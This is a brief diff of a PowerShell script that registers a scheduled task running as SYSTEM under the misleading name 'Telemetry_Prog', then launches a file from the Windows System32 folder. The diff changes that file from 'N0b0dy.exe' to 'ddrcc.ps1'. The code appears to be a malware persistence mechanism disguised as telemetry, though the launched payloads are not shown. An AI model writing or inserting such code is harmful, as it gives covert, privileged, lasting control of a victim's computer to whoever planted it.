@@ -14,5 +14,5 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType
 # register scheduled task
 Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
 # start process
-& "C:\Windows\System32\N0b0dy.exe"
+& "C:\Windows\System32\ddrcc.ps1"
 
